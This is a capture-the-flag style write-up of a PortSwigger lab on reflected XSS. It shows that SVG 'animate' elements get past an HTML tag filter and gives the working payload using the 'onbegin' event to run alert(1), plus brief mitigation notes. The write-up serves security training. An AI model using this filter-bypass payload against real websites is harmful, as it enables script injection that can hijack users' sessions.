# Lab13 - Reflected XSS With Some SVG Markup Allowed

## Objective

Exploit reflected XSS where SVG tags remain allowed.

Execute:

```javascript
alert(1)
```

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Reflected XSS |
| Difficulty | Practitioner |
| Context | HTML Context |
| Platform | PortSwigger |

---

# Vulnerability Overview

Many HTML elements are filtered.

However:

```html
<svg>
```

remains allowed.

---

# Analysis

## Step 1

Identify allowed tags.

Observation:

```html
svg
animate
```

survive filtering.

---

## Step 2

Look for executable SVG features.

---

## Step 3

Use:

```html
animate
```

to trigger JavaScript.

---

# Full Payload(s) Used

```html
<svg>
<animate attributeName=x
dur=1s
repeatCount=1
onbegin=alert(1)>
</svg>
```

---

# Why The Payload Works

```text
SVG Allowed
        ↓
Animate Allowed
        ↓
onbegin Fires
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Goal

Find surviving SVG elements.

---

## Observation

```html
svg
animate
```

not filtered.

---

## Strategy

Abuse SVG animation events.

---

## Result

```javascript
alert(1)
```

executed.

Lab solved.

---

# Mitigation

Sanitize SVG separately.

Remove executable events.

---

# Key Learnings

- SVG is a common filter bypass vector.
- SVG events frequently survive filtering.
- Never assume HTML filtering covers SVG.